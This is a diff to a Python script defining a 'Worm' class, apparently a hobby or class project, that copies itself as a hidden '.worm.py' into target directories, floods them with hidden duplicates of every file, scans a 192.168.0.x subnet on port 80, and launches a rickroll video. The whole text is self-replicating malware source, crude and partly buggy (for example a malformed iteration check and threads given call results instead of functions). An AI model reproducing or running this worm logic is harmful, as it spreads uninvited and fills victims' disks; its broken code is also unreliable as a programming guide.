@@ -5,6 +5,7 @@ import time
 import shutil
 import logging
 import subprocess
+import urllib
 
 #Threading imports - AR
 from threading import Thread, Lock
@@ -17,6 +18,7 @@ BASE_IP = "192.168.0.%i"
 PORT = 80
 COUNT = 3
 RICKLOC = "\\..\\Rick_Eternal.mp4"
+YOUTUBETOO = False
 
 #------------------------------------------THREADER CLASS---------------------------------------------- -AR
 class Threader:
@@ -108,23 +110,29 @@ class Worm:
                     else:
                         pass   
         except:
-            logging.warning("exception occurred, no list of directories")
+            logging.warning("exception occurred: worm failed to list directories")
     
     def create_new_worm(self):
-        for directory in self.target_dir_list:
-            destination = os.path.join(directory, ".worm.py")
-            shutil.copyfile(self.own_path, destination)
+        try:
+            for directory in self.target_dir_list:
+                destination = os.path.join(directory, ".worm.py")
+                shutil.copyfile(self.own_path, destination)
+        except:
+            logging.warning("exception occurred: cannot create new worm")
     
     def copy_existing_files(self):
-        for directory in self.target_dir_list:
-            file_list_in_dir = os.listdir(directory)
-            for file in file_list_in_dir:
-                abs_path = os.path.join(directory, file)
-                if not abs_path.startswith(".") and not os.path.isdir(abs_path):
-                    source = abs_path
-                    for i in range(self.iteration):
-                        destination = os.path.join(directory, ("."+file+str(i)))
-                        shutil.copyfile(source, destination)
+        try:
+            for directory in self.target_dir_list:
+                file_list_in_dir = os.listdir(directory)
+                for file in file_list_in_dir:
+                    abs_path = os.path.join(directory, file)
+                    if not abs_path.startswith(".") and not os.path.isdir(abs_path):
+                        source = abs_path
+                        for i in range(self.iteration):
+                            destination = os.path.join(directory, ("."+file+str(i)))
+                            shutil.copyfile(source, destination)
+        except:
+            logging.warning("exception occurred: cannot copy")
                         
     #Network Identification----- -AR
     def connect(hostname, port):
@@ -135,7 +143,7 @@ class Worm:
                 stderr.write(f"[{perf_counter() - start:.5f}] Found {hostname}\n")
                 logging.warning(f"[{perf_counter() - start:.5f}] Found {hostname}\n")
                 
-     #Network Identification Iterator----- -AR
+    #Network Identification Iterator----- -AR
     def connection_iterator(self):
         for i in range(255):
             self.threader.append(worm.connect, BASE_IP%i, PORT)
@@ -144,29 +152,28 @@ class Worm:
         logging.warning(f"[{perf_counter() - start:.5f}] Done Searching")
     
     def rick_and_roll(self):
-        for i in range(0, COUNT):
-            os.startfile(self.own_path + RICKLOC)
-            
-    
-    def start_worm_actions(self):
         try:
-            self.list_directories(self.path)
-        except:
-            logging.warning("exception occurred: worm failed to list directories")
-        print(self.target_dir_list)
-        try:
-            self.create_new_worm()
-        except:
-            logging.warning("exception occurred: cannot create new worm")
-        try:
-            self.copy_existing_files()
-        except:
-            logging.warning("exception occurred: cannot copy")
-        try:
-            self.rick_and_roll()
+            if self.iteration == None | self.iteration < 2:
+                os.startfile(self.own_path + RICKLOC)
+                if YOUTUBETOO:
+                    for i in range(0, COUNT):
+                        urllib.urlopen('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
         except:
             logging.warning("exception occurred: no rick?")
+
+    def start_worm_actions(self):
+        print(self.target_dir_list)
+        try:
+            self.threader.append(self.list_directories(self.path))
+            self.threader.append(self.create_new_worm())
+            self.threader.append(self.copy_existing_files())
+            self.threader.append(self.rick_and_roll())
+            self.threader.start()
+            self.threader.join()
+        except:
+            logging.warning("something went wrong")
         #self.connection_iterator()
+        
         
     
 if __name__=="__main__":
